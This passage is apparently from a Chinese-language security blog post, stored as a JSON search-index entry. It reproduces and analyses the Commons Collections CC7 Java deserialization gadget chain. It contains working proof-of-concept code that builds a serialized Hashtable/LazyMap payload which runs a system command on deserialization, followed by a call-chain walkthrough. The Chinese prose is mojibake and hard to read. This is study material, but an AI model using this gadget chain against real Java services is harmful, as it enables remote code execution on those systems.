InvokerTransformer(&quot;getMethod&quot;, new Class[]{String.class, Class[].class}, new Object[]{&quot;getRuntime&quot;, new Class[0]}), new InvokerTransformer(&quot;invoke&quot;, new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}), new InvokerTransformer(&quot;exec&quot;, new Class[]{String.class}, new Object[]{&quot;calc&quot;}) }; //ChainedTransformerå®ä¾‹ //å…ˆè®¾ç½®å‡çš„ Transformer æ•°ç»„ï¼Œé˜²æ­¢ç”Ÿæˆæ—¶æ‰§è¡Œå‘½ä»¤ Transformer chainedTransformer = new ChainedTransformer(fakeTransformerransformer); //LazyMapå®ä¾‹ Map innerMap1 = new HashMap(); Map innerMap2 = new HashMap(); Map lazyMap1 = LazyMap.decorate(innerMap1,chainedTransformer); lazyMap1.put(&quot;yy&quot;, 1); Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer); lazyMap2.put(&quot;zZ&quot;, 1); Hashtable hashtable = new Hashtable(); hashtable.put(lazyMap1, &quot;test&quot;); hashtable.put(lazyMap2, &quot;test&quot;); //é€šè¿‡åå°„è®¾ç½®çœŸçš„ ransformer æ•°ç»„ Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;); field.setAccessible(true); field.set(chainedTransformer, transformers); //ä¸Šé¢çš„ hashtable.put ä¼šä½¿å¾— lazyMap2 å¢åŠ ä¸€ä¸ª yy=&gt;yyï¼Œæ‰€ä»¥è¿™é‡Œè¦ç§»é™¤ lazyMap2.remove(&quot;yy&quot;); //åºåˆ—åŒ– ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(hashtable); oos.flush(); oos.close(); //æµ‹è¯•ååºåˆ—åŒ– ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray()); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); } } åˆ©ç”¨é“¾Hashtable.readObject() Hashtable.reconstitutionPut() AbstractMapDecorator.equals() AbstractMap.equals() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() â€¦â€¦â€¦â€¦ åé¢è¿˜æ˜¯LazyMap.get() AbstractMapequalsæ–¹æ³•ä¸­è°ƒç”¨äº†m.get(key);è¿™é‡Œmå’Œkeyå¯æ§ã€‚ä½†æ˜¯å› ä¸ºAbstractMapæ˜¯ä¸€ä¸ªabstractç±»,åœ¨æ„é€ pocæ—¶åªèƒ½æ‰¾å®ƒçš„å­ç±»,è€Œä¸”æ²¡æœ‰é‡å†™è¯¥æ–¹æ³•,åœ¨pocä¸­é€‰æ‹©çš„å°±æ˜¯å®ƒçš„å­ç±»HashMap AbstractMapDecoratorMapå¯æ§ã€‚è¯¥ç±»ä¸ºlazpMapçš„çˆ¶ç±» HashtablereconstitutionPutæ–¹æ³•è°ƒç”¨e.key.equals,å‚æ•°å¯æ§ readObjectå…¥å£å¤„ä¹Ÿç›´æ¥è°ƒç”¨äº†reconstitutionPutæ–¹æ³•, æµç¨‹å›¾ å…¶å®ä½†çœ‹è¿™æµç¨‹å›¾æˆ‘è§‰å¾—è¿˜æ˜¯æœ‰ä¸€ç‚¹æ˜çš„,æˆ‘ä¸Šé¢å…¶å®ä¹Ÿæœ‰å¾ˆå¤šåœ°æ–¹æ²¡æœ‰è¯´æ¸…æ¥š,æ¯”å¦‚ä¸ºä»€ä¹ˆe.keyå¯æ§,å› ä¸ºæˆ‘è§‰å¾—è¿™äº›é…åˆpocä¸€èµ·çœ‹å¾—è¯å¯èƒ½æ›´å®¹æ˜“ç†è§£ æµç¨‹åˆ†æ é¦–å…ˆæˆ‘ä»¬è¿™é‡Œæ˜¯putäº†ä¸¤æ¬¡,åœ¨è¿›å…¥reconstitutionPutæ–¹æ³•å‰,ä¼šæœ‰ä¸€ä¸ªforå¾ªç¯,è¿™é‡Œæˆ‘ä»¬çš„Keyå’ŒValueæ˜¯ä½¿ç”¨readObjectå¾—åˆ°çš„,é‚£æˆ‘ä»¬å¾—å…ˆå»çœ‹ä¸€ä¸‹writeObjectæ–¹æ³• writeObjectä¸­ å¾ˆå®¹æ˜“çœ‹å‡º,è¿™é‡Œä¼ é€’çš„å®é™…ä¸Šå°±æ˜¯HashTable#putæ—¶æ·»åŠ è¿›å»çš„keyå’Œvalueã€‚ å½“æˆ‘ä»¬ç¬¬ä¸€æ¬¡è¿›å…¥reconstitutionPutæ–¹æ³•æ—¶,tabæ•°ç»„æ˜¯æ²¡æœ‰å€¼çš„,æ‰€ä»¥æ— æ³•è¿›å…¥forå¾ªç¯è°ƒç”¨equalsæ–¹æ³•,tab[index]çš„èµ‹å€¼æ˜¯åœ¨forå¾ªç¯çš„åé¢ å½“æˆ‘ä»¬ç¬¬äºŒæ¬¡è¿›å…¥reconstitutionPutæ–¹æ³•æ—¶ æˆ‘ä»¬çš„e.keyæ˜¯ç¬¬ä¸€æ¬¡putçš„å€¼,keyæ˜¯ç¬¬äºŒæ¬¡putçš„å€¼ã€‚ ä¹‹å‰åœ¨çœ‹åˆ©ç”¨é“¾æ—¶,æˆ‘å°±åœ¨æƒ³,ä¸ºä»€ä¹ˆè¿™é‡Œèƒ½ç›´æ¥è°ƒç”¨AbstractMap.equals(),ä¸ºä»€ä¹ˆè¿˜è¦å»å…ˆè°ƒç”¨AbstractMapDecorator.equals()å‘¢ äºæ˜¯è‡ªå·±åšäº†ä¸€ä¸ªæµ‹è¯•,æˆ‘æŠŠç¬¬ä¸€æ¬¡putçš„å€¼è®¾ç½®ä¸ºhashMap,æƒ³ç›´æ¥è°ƒç”¨AbstractMap.equals(new LazyMap()) ä½†æ˜¯å‘ç°ä»–ç¬¬äºŒæ¬¡å¹¶æ²¡æœ‰å¦‚æˆ‘ä»¬æ‰€æ„¿è¿›å…¥forå¾ªç¯,åŸå› æ—¶å› ä¸ºç¬¬ä¸€æ¬¡ä¼ å…¥hashMapæ—¶è®¡ç®—ç”Ÿæˆçš„index=0,è€Œç¬¬äºŒæ¬¡ä¼ å…¥lazyMapæ—¶ç”Ÿæˆçš„index=3,æ‰€ä»¥å¹¶ä¸å­˜åœ¨tab[3]ã€‚è€Œä¸¤æ¬¡putçš„éƒ½æ˜¯lazymapçš„è¯,indexè®¡ç®—å‡ºæ¥éƒ½æ˜¯ç­‰äº3.è¿™é‡Œçœ‹ä¼¼e.keyå’Œkeyå¯æ§,ä½†å®é™…ä¸Šè¿˜æ˜¯æœ‰äº›é™åˆ¶çš„ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}],"tags":[{"name":"Javaå¤ç°","slug":"Javaå¤ç°","permalink":"https://pp1ove.gitee.io/tags/Javaå¤ç°/"}],"keywords":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://pp1ove.gitee.io/categories/æŠ€æœ¯/"}]}]}